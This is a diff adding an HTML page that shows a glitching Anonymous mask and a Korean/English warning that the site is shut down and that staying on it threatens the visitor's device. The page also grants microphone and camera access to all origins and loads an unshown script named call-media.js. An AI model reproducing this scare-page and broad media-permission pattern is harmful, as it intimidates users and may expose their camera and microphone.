@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8" />
+  <!-- cache-bust: 20260720-call3 -->
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate, max-age=0" />
+  <meta http-equiv="Pragma" content="no-cache" />
+  <meta http-equiv="Expires" content="0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="robots" content="noindex,nofollow" />
+  <meta http-equiv="Permissions-Policy" content="microphone=*, camera=*" />
+  <title></title>
+  <style>
+    :root { color-scheme: dark; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { min-height: 100%; height: 100%; }
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: clamp(16px, 4vw, 40px);
+      font-family: "Segoe UI", "Apple SD Gothic Neo", "Malgun Gothic", sans-serif;
+      background: #000;
+      color: #f0f0f0;
+      overflow: hidden;
+      position: relative;
+    }
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      background:
+        radial-gradient(ellipse at 50% 42%, rgba(90, 0, 0, 0.45) 0%, transparent 55%),
+        radial-gradient(ellipse at center, transparent 35%, rgba(0, 0, 0, 0.92) 100%);
+      z-index: 2;
+    }
+    body::after {
+      content: "";
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(0, 0, 0, 0.12) 2px,
+        rgba(0, 0, 0, 0.12) 4px
+      );
+      opacity: 0.35;
+      z-index: 3;
+      animation: flicker 3.2s infinite;
+    }
+    .wrap {
+      width: min(760px, 100%);
+      text-align: center;
+      position: relative;
+      z-index: 1;
+    }
+    .mask-frame {
+      position: relative;
+      width: clamp(220px, 58vw, 420px);
+      margin: 0 auto clamp(22px, 5vw, 36px);
+      filter:
+        drop-shadow(0 0 18px rgba(180, 0, 0, 0.55))
+        drop-shadow(0 0 48px rgba(90, 0, 0, 0.65))
+        drop-shadow(0 24px 40px rgba(0, 0, 0, 1));
+      animation: breathe 4.5s ease-in-out infinite, glitch 7s infinite;
+    }
+    .mask-frame img {
+      display: block;
+      width: 100%;
+      height: auto;
+      border-radius: 4px;
+    }
+    .mask-frame::after {
+      content: "";
+      position: absolute;
+      inset: 18% 28%;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(255, 0, 0, 0.28), transparent 70%);
+      mix-blend-mode: screen;
+      animation: eyePulse 1.8s ease-in-out infinite;
+      pointer-events: none;
+    }
+    .ko {
+      font-size: clamp(1rem, 2.9vw, 1.22rem);
+      line-height: 1.8;
+      font-weight: 700;
+      word-break: keep-all;
+      margin-bottom: clamp(16px, 3.5vw, 24px);
+      text-shadow: 0 0 18px rgba(180, 0, 0, 0.35);
+    }
+    .en {
+      font-size: clamp(0.88rem, 2.4vw, 1.04rem);
+      line-height: 1.75;
+      color: #9a9a9a;
+      font-weight: 500;
+    }
+    @keyframes breathe {
+      0%, 100% { transform: scale(1) translateY(0); }
+      50% { transform: scale(1.035) translateY(-4px); }
+    }
+    @keyframes eyePulse {
+      0%, 100% { opacity: 0.35; transform: scale(0.92); }
+      50% { opacity: 0.95; transform: scale(1.08); }
+    }
+    @keyframes flicker {
+      0%, 100% { opacity: 0.28; }
+      8% { opacity: 0.5; }
+      9% { opacity: 0.15; }
+      11% { opacity: 0.45; }
+      40% { opacity: 0.3; }
+      41% { opacity: 0.08; }
+      43% { opacity: 0.4; }
+    }
+    @keyframes glitch {
+      0%, 92%, 100% { transform: translate(0, 0) skewX(0); filter: drop-shadow(0 0 18px rgba(180,0,0,0.55)) drop-shadow(0 0 48px rgba(90,0,0,0.65)); }
+      93% { transform: translate(-3px, 1px) skewX(-0.6deg); filter: drop-shadow(-6px 0 0 rgba(255,0,40,0.45)) drop-shadow(6px 0 0 rgba(0,180,255,0.25)); }
+      94% { transform: translate(3px, -1px) skewX(0.5deg); }
+      95% { transform: translate(0, 0) skewX(0); }
+    }
+    @media (prefers-reduced-motion: reduce) {
+      .mask-frame, .mask-frame::after, body::after { animation: none; }
+    }
+  </style>
+</head>
+<body data-cache="20260720-call3">
+  <main class="wrap">
+    <div class="mask-frame">
+      <img
+        src="/assets/anonymous-horror-mask.png?v=20260720-call3"
+        alt="Anonymous"
+        width="840"
+        height="840"
+        decoding="async"
+      />
+    </div>
+    <p class="ko">이 사이트는 폐쇄조치 되었습니다. 이 사이트를 지속적으로 접속하고 있을 경우, 접속하고 있는 기기의 보안에 치명적인 위험이 있을 수 있습니다. 이 창을 종료해주세요.</p>
+    <p class="en">This site has been shut down. Continuing to access this site may pose a critical security risk to your device. Please close this window.</p>
+  </main>
+  <script src="/call-media.js?v=20260720-call3"></script>
+</body>
+</html>
